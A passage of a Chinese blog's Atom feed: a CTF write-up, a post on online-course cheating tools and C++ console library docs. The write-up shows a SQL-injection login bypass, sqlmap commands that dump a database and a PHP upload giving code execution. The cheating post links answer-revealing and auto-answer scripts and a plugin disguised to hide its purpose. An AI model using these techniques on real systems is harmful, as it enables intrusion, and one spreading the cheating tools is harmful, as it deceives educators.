title="大灾变：劫后余生"></a></p><p>当然还有著名的生命游戏。</p><p>谢谢你花时间阅读这篇博客。：）</p><p>在评论区留个脚印吧～</p>]]></content>
    
    <summary type="html">
    
      命令行上的游戏，能有多少人喜欢？
    
    </summary>
    
    
    
      <category term="C++" scheme="https://cdn.n0p3.cn/tags/C/"/>
    
      <category term="Windows" scheme="https://cdn.n0p3.cn/tags/Windows/"/>
    
      <category term="命令行" scheme="https://cdn.n0p3.cn/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>i春秋 新春战疫WriteUp</title>
    <link href="https://cdn.n0p3.cn/2020/02/25/i%E6%98%A5%E7%A7%8B-%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB/"/>
    <id>https://cdn.n0p3.cn/2020/02/25/i%E6%98%A5%E7%A7%8B-%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB/</id>
    <published>2020-02-25T02:07:44.000Z</published>
    <updated>2020-05-19T04:48:27.058Z</updated>
    
    <content type="html"><![CDATA[<p>这次公开赛并没有怎么花时间打，总共就做出两道web。<em>（花时间也不会做）</em></p><p>以下是这两道题的wp</p><h1 id="招聘系统"><a href="#招聘系统" class="headerlink" title="招聘系统"></a>招聘系统</h1><p>可以注册一个账号进入，会发现有一个页面需要管理员权限</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204657.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204657.png" class="lazyload" title></a></p><p>在登录框处存在sql注入漏洞，单引号闭合后，用井号注释掉后面的语句，即可任意密码登陆管理员。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204612.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204612.png" class="lazyload" title></a>打开那个需要管理员的页面</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204802.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204802.png" class="lazyload" title></a></p><p>想到此处可能存在sql注入</p><p>加单引号和井号后页面加载时间异常</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204824.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204824.png" class="lazyload" title></a></p><p>很可能可以注入</p><p>抓个包，居然是get。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20205250.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20205250.png" class="lazyload" title></a></p><p>放进sqlmap跑一下</p><p><code>sqlmap -r flag.txt</code></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20205444.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20205444.png" class="lazyload" title></a></p><p>找到变量key存在注入</p><p>爆个库，</p><p><code>sqlmap -r flag.txt --dbs</code></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210011.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210011.png" class="lazyload" title></a></p><p>nzhaopin应该就是flag在的库</p><p>再暴个表</p><p><code>sqlmap -r flag.txt -D nzhaopin --tables</code></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210052.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210052.png" class="lazyload" title></a></p><p>找到flag表</p><p>暴一下字段</p><p><code>sqlmap -r flag.txt -D nzhaopin -T flag --columns</code></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210152.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210152.png" class="lazyload" title></a></p><p>看到flaaag字段</p><p>暴flaaag字段</p><p><code>sqlmap -r flag.txt -D nzhaopin -T flag -C &quot;flaaag&quot; --dump</code></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210303.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210303.png" class="lazyload" title></a></p><p>Get flag.</p><p>本题手注wp可以参考 <a href="https://www.yuque.com/r1car/tnf7vi/rp443a" target="_blank" rel="noopener">1ight师傅的wp</a></p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>先随意上传一个文件，抓包</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20203307.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20203307.png" class="lazyload" title></a></p><p>把文件后缀改php，文件内容改成一段脚本，上传后访问上传到的位置。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204040.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204040.png" class="lazyload" title></a></p><p>发现可以执行任意代码。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204238.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204238.png" class="lazyload" title></a></p><p>看到当前位置后，向后访问</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20203841.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20203841.png" class="lazyload" title></a></p><p>最后在这个目录下找到了flag</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204317.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204317.png" class="lazyload" title></a></p><p>直接用cat命令读不到flag，好像flag文件本来就是空的。</p><p>运行readflag程序</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204354.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204354.png" class="lazyload" title></a></p><p>Get flag.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这次公开赛并没有怎么花时间打，总共就做出两道web。&lt;em&gt;（花时间也不会做）&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;以下是这两道题的wp&lt;/p&gt;
&lt;h1 id=&quot;招聘系统&quot;&gt;&lt;a href=&quot;#招聘系统&quot; class=&quot;headerlink&quot; title=&quot;招聘系统&quot;&gt;&lt;/a&gt;招聘系统
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://cdn.n0p3.cn/tags/CTF/"/>
    
      <category term="参加的比赛" scheme="https://cdn.n0p3.cn/tags/%E5%8F%82%E5%8A%A0%E7%9A%84%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>Save My Time</title>
    <link href="https://cdn.n0p3.cn/2020/02/19/SaveMyTime/"/>
    <id>https://cdn.n0p3.cn/2020/02/19/SaveMyTime/</id>
    <published>2020-02-19T13:40:40.000Z</published>
    <updated>2020-08-03T15:03:03.157Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TamperMonkey类"><a href="#TamperMonkey类" class="headerlink" title="TamperMonkey类"></a>TamperMonkey类</h1><p>挂梯子下载谷歌插件<a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN" target="_blank" rel="noopener">Tampermonkey</a></p><h3 id="超星学习通，学银在线-已失效"><a href="#超星学习通，学银在线-已失效" class="headerlink" title="超星学习通，学银在线(已失效)"></a>超星学习通，学银在线(已失效)</h3><p>可以使用<a href="[https://greasyfork.org/zh-CN/scripts/369625-%E8%B6%85%E6%98%9F%E7%BD%91%E8%AF%BE%E5%8A%A9%E6%89%8B](https://greasyfork.org/zh-CN/scripts/369625-超星网课助手)">超星网课助手</a></p><p>学银在线需要在插件源码<em>UserScript</em>中添加一行</p><p><code>// @match        *://*.xueyinonline.com/*</code></p><h3 id="U校园、MOOC"><a href="#U校园、MOOC" class="headerlink" title="U校园、MOOC"></a>U校园、MOOC</h3><p>下载插件<a href="https://greasyfork.org/zh-CN/scripts/392023-u%E6%A0%A1%E5%9B%AD%E8%8B%B1%E8%AF%AD%E7%BD%91%E8%AF%BE%E7%AD%94%E6%A1%88%E6%98%BE%E7%A4%BA" target="_blank" rel="noopener">U校园答案显示</a>、<a href="https://greasyfork.org/zh-CN/scripts/396410-domooc" target="_blank" rel="noopener">MOOC自动答题</a></p><h1 id="超星学习通"><a href="#超星学习通" class="headerlink" title="超星学习通"></a>超星学习通</h1><h1 id="优学院"><a href="#优学院" class="headerlink" title="优学院"></a>优学院</h1><p>优学院可以使用<a href="https://n0p3.oss-cn-beijing.aliyuncs.com/source/n0p3.zip" target="_blank" rel="noopener">优学院辅助插件</a></p><p>(已经被我改的看不出来是刷课插件了)</p><h2 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h2><p>这是一个谷歌浏览器插件，下载后解压得到文件夹。在谷歌浏览器插件管理中点【加载已解压的插件】选解压后的文件夹即可。</p><p>在网页内单击右键找到N0P3</p><p>获取神秘字符串即显示答案</p><p>填写神秘字符串即填写填空题答案</p><p>5x可将视频五倍速播放（这已经是不会造成卡死的最快速度了）</p><p>Ps：不能自动换页<em>（等我仔细分析一下源码或许能加上）</em></p><h1 id="访问校园网（查成绩）"><a href="#访问校园网（查成绩）" class="headerlink" title="访问校园网（查成绩）"></a>访问校园网（查成绩）</h1><p>首先下载SSLVPN</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/source/SSLVPN.exe" target="_blank" rel="noopener">SSLVPN</a></p><p>安装后第一行填<a href="https://122.207.223.254/" target="_blank" rel="noopener">https://122.207.223.254/</a> （<em>参见<a href="https://net.nyist.edu.cn/info/1047/1126.htm" target="_blank" rel="noopener">学校发布的文档</a></em>）</p><p>用户名填学号</p><p>密码是身份证后6位</p><p>登录成功后就可以正常访问<a href="http://222.139.215.217/jwweb/" target="_blank" rel="noopener">教务管理系统</a></p><h1 id="超星查看被锁课程"><a href="#超星查看被锁课程" class="headerlink" title="超星查看被锁课程"></a>超星查看被锁课程</h1><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.43.21.jpg" data-fancybox="group" data-caption="进入" class="fancybox"><img alt="进入" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.43.21.jpg" class="lazyload" title="进入"></a></p><p>看到第一课时被锁</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.55.18.jpg" data-fancybox="group" data-caption="点标题" class="fancybox"><img alt="点标题" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.55.18.jpg" class="lazyload" title="点标题"></a></p><p>进入这里预览课程</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.58.21.jpg" data-fancybox="group" data-caption="预览" class="fancybox"><img alt="预览" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.58.21.jpg" class="lazyload" title="预览"></a></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.59.46.png" data-fancybox="group" data-caption="ok" class="fancybox"><img alt="ok" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.59.46.png" class="lazyload" title="ok"></a></p><p>OK 能看了。</p>]]></content>
    
    <summary type="html">
    
      省下时间去做更重要的事
    
    </summary>
    
    
    
      <category term="study" scheme="https://cdn.n0p3.cn/tags/study/"/>
    
      <category term="cheat" scheme="https://cdn.n0p3.cn/tags/cheat/"/>
    
      <category term="easy" scheme="https://cdn.n0p3.cn/tags/easy/"/>
    
  </entry>
  
  <entry>
    <title>C++,Windows,XzyGraphics图形库</title>
    <link href="https://cdn.n0p3.cn/2020/02/10/C-Windows-XzyGraphics%E5%9B%BE%E5%BD%A2%E5%BA%93/"/>
    <id>https://cdn.n0p3.cn/2020/02/10/C-Windows-XzyGraphics%E5%9B%BE%E5%BD%A2%E5%BA%93/</id>
    <published>2020-02-10T12:12:03.000Z</published>
    <updated>2020-05-19T06:10:32.313Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="基本内容"><a href="#基本内容" class="headerlink" title="基本内容"></a>基本内容</h1><p><strong>坐标：</strong><br>左上角为原点，x轴向右延伸，y轴向下延伸，无负坐标。<br>使用GOTOXY函数来控制光标位置。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GOTOXY(<span class="number">1</span>,<span class="number">1</span>)<span class="comment">//控制光标至控制台左上角</span></span><br></pre></td></tr></table></figure></div><p><strong>颜色：</strong><br>下划线加颜色单词，例如_Red为红色。<br>下划线前加<strong>H</strong>代表高亮,H_Red为高亮红。<br>高亮灰H_Gray为白色。<br>所有的颜色单词可以在头文件中看到。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SETCOLOR(_Green,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">//执行后接下来程序的输出颜色就是绿色了，</span></span><br><span class="line"><span class="comment">//后两个参数是颜色修改失败时报错信息的输出位置</span></span><br></pre></td></tr></table></figure></div><p><strong>光标：</strong><br>光标的显示与隐藏可以使用<strong>GUANGBIAO</strong>函数来控制。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GUANGBIAO(<span class="number">0</span>);<span class="comment">//0为不显示，1为显示</span></span><br></pre></td></tr></table></figure></div><p><strong>输出：</strong><br>封装了一个输出函数<strong>SAY</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SAY(H_Green,<span class="number">4</span>,<span class="number">5</span>,<span class="string">"Hello World!"</span>);</span><br><span class="line"><span class="comment">//在（4，5）位置输出一个高亮的绿色Hello World！</span></span><br></pre></td></tr></table></figure></div><h2 id="绘制函数"><a href="#绘制函数" class="headerlink" title="绘制函数"></a>绘制函数</h2><p><strong>ANYLINE</strong>函数是用来画横线的</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ANYLINE(_Blue,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="string">"+"</span>,<span class="number">1</span>);<span class="comment">//这条语句将会在（2，3）的位置输出5次+，每次输出后向右移动1个单位。</span></span><br></pre></td></tr></table></figure></div><p><strong>VERTICALLINE</strong>函数是用来画竖线的</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VERTICALLINE(_Yellow,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="string">"|"</span>);<span class="comment">//从（4，5）开始向下输出7次 |。</span></span><br></pre></td></tr></table></figure></div><p><strong>DRAW_SQURE</strong>函数用来画方框</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DRAW_SQURE(<span class="number">1</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">7</span>,_Green,<span class="string">"+"</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//很简单，看看变量名就知道了</span></span><br></pre></td></tr></table></figure></div><p>绘制函数基本上还没有怎么写，以后会有更多方便的绘制函数。主要的内容在下面。</p><h1 id="FORM类"><a href="#FORM类" class="headerlink" title="FORM类"></a>FORM类</h1><p>FORM是一个可以生成选单的类</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> selection = <span class="number">0</span>;</span><br><span class="line"><span class="function">FORM <span class="title">HELP</span><span class="params">(<span class="number">3</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">2</span>)</span></span>;<span class="comment">//实例化一个选单对象HELP</span></span><br><span class="line">HELP.title = <span class="string">"Developer  N0P3"</span>;<span class="comment">//设置选单的标题</span></span><br><span class="line">HELP.TitleColor = H_GreenBlue;<span class="comment">//设置标题的颜色</span></span><br><span class="line">HELP.SETOPTIONNAME(<span class="number">0</span>, <span class="string">"键入限制函数 ENTER"</span>);<span class="comment">//设置0号选项名字</span></span><br><span class="line">HELP.SETOPTIONNAME(<span class="number">1</span>, <span class="string">"选单类 FORM"</span>);<span class="comment">//设置1号选项名字</span></span><br><span class="line">HELP.SETOPTIONNAME(<span class="number">2</span>, <span class="string">"绘制函数组"</span>);<span class="comment">//设置2号选项名字</span></span><br><span class="line">HELP.SETOPTIONNAME(<span class="number">3</span>, <span class="string">"其他"</span>);<span class="comment">//设置3号选项名字</span></span><br><span class="line">selection = HELP.SELECTION(<span class="number">10</span>, <span class="number">0</span>, <span class="number">14</span>);<span class="comment">//展开选单并让用户选择</span></span><br><span class="line"><span class="comment">//只需要简单的几行就可以构造一个完整的选择菜单</span></span><br></pre></td></tr></table></figure></div><p>实例化一个选单对象时，前四个参数指定了生成位置左上角横纵坐标和右下角横纵坐标，最后两个是横向选项个数和纵向选项个数。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.23.03.png" data-fancybox="group" data-caption="自动生成的2x2选择菜单" class="fancybox"><img alt="自动生成的2x2选择菜单" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.23.03.png" class="lazyload" title="自动生成的2x2选择菜单"></a><br>//觉得丑(?)可以自定义颜色和符号</p><h2 id="主要成员变量"><a href="#主要成员变量" class="headerlink" title="主要成员变量"></a>主要成员变量</h2><p><strong>字符串（string）：</strong><br>选单标题<strong>title</strong>，构成选单的字符<strong>FormStr</strong><br>，构成选项的字符<strong>OptionStr</strong>.</p><p><strong>整型 (int):</strong></p><p>选单的左上角坐标<strong>x1,y1</strong><br>选单的右下角坐标<strong>x2,y2</strong><br>选单标题的颜色<strong>TitleColor</strong><br>每行选项个数<strong>optionX</strong><br>每列选项个数<strong>optionY</strong></p><h2 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h2><p><strong>选择函数SELECTION：</strong><br>共接收三个整型参数：<br>选单外框颜色<strong>COLOR_form</strong><br>选项的颜色<strong>COLOR_option</strong><br>选项名的颜色<strong>COLOR_str</strong></p><p>返回值为整型，返回的是选项的值。选项的值默认从0开始按从上到下，从左到右的顺序直至最后一个选项。</p><p>函数调用后会在控制台展开一个选单，wsad（小写）控制高亮显示的选项，按下回车则函数返回选项的值，esc键退出选择返回值 -1。</p><p>使用后的选单不会清理自己。</p><p><strong>清空函数CLEAR：</strong><br>不需要参数，调用后清理选单所在的位置<br>无返回值</p><p><strong>设置值函数SETVALUE：</strong><br>需要两个整型参数：<br>选项编号<strong>id</strong><br>修改的值<strong>InValue</strong><br>无返回值。</p><p><strong>获得值函数GETVALUE：</strong><br>提供选项编号<strong>id</strong>，返回选项的值。</p><p><strong>设置选项名函数SETOPTIONNAME：</strong><br>提供选项编号<strong>id</strong>和选项名<strong>InName</strong>，默认选项没有名字。</p><p><strong>获得选项值函数GETOPTIONNAME：</strong><br>提供选项编号<strong>id</strong>，返回选项的名字。</p><p><strong>获得选项坐标函数GETOPTIONXY：</strong><br>需要提供选项<strong>id</strong>和两个用于储存选项坐标的整型变量。</p><p><strong>绘制函数DRAW：</strong><br>同样需要三个整型参数：<br>选单外框颜色<strong>COLOR_form</strong><br>选项的颜色<strong>COLOR_option</strong><br>选项名的颜色<strong>COLOR_str</strong><br>绘制函数会在屏幕上绘制选单。<br>无返回值</p><p><strong>测试函数TEST：</strong><br><em>这个函数旨在开发阶段帮助开发者调整合适的选单参数。</em></p><p>不需要参数。</p><p> 